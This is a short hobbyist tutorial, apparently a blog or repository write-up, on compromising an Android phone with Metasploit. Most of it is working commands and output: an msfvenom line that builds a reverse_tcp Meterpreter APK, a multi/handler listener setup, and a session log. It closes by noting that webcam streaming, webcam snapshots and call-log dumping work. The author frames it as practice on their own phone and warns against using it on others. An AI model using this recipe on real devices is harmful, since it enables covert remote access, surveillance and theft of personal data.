## Android exploit with Metasploit
I'm doing this as an exercise to understand how Metasploit and Android exploits work. Needless to say that if you want to experiment with this do it with own your phone or ask for permission, this is so much fun just if everybody is aware of it, otherwise it's not ethical and it's also a crime :)

### Set-up
- MacOS High Sierra attacker with Metasploit
- Android phone: Galaxy J2 Pro, Android 7.1.1

### Generate apk
First, get your IP address (attacker) using `ifconfig`:
```
$ ifconfig en0 | grep 192
	inet 192.168.1.37 netmask 0xffffff00 broadcast 192.168.1.255
```

Use `msfvenom` (part of Metasploit) to generate the "malicious" apk (remember to use your IP adress here):
```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.37 LPORT=4444 R > boom.apk
[-] No platform was selected, choosing Msf::Module::Platform::Android from the payload
[-] No arch selected, selecting arch: dalvik from the payload
No encoder specified, outputting raw payload
Payload size: 10188 bytes
```

### Start listener
Now, before copying and installing the apk on the phone, we need to start a handler that will catch the reverse tcp call from the app. This will be done using `msfconsole`:

```bash
$ msfconsole
msf5 > use exploits/multi/handler
msf5 exploit(multi/handler) > set payload android/meterpreter_reverse_tcp
msf5 exploit(multi/handler) > set LHOST 192.168.1.37
msf5 exploit(multi/handler) > set LPORT 4444
msf5 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 192.168.1.37:4444
```

### Install/run the app
Copy the apk file to the phone, and execute it. I must say this looks reeeally sketchy when installing. It does not have a logo, app's name seems to be *Main Activity* LOL, and it logically needs a lot of permissions for being as functional as possible: 
[Imgur](https://imgur.com/IrBu8Jy)

Before being able to install it you'll most likely need to change your settings as it the apk comes from an "unknown source". You'll also have to go through a series of warnings that look bad enough for anybody to understand it's not safe to install/open this file. I guess there are other ways of generating this apk so that it's not so noisy, but this one does the job for this case anyways.

### Got shell!
After executing the app (not without having had to retry the install process), our handler pops a shell:
```bash
msf5 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 192.168.1.37:4444
[*] Sending stage (73742 bytes) to 192.168.1.60
[*] Meterpreter session 1 opened (192.168.1.37:4444 -> 192.168.1.60:42099) at 2020-06-06 20:50:50 +0200
```
So we can go ahead and do the fun stuff. You can enter `help` to see all the available commands in the meterpreter session. I verified some of them worked like `webcam_stream`, `webcam_snap` and `dump_calllog`.
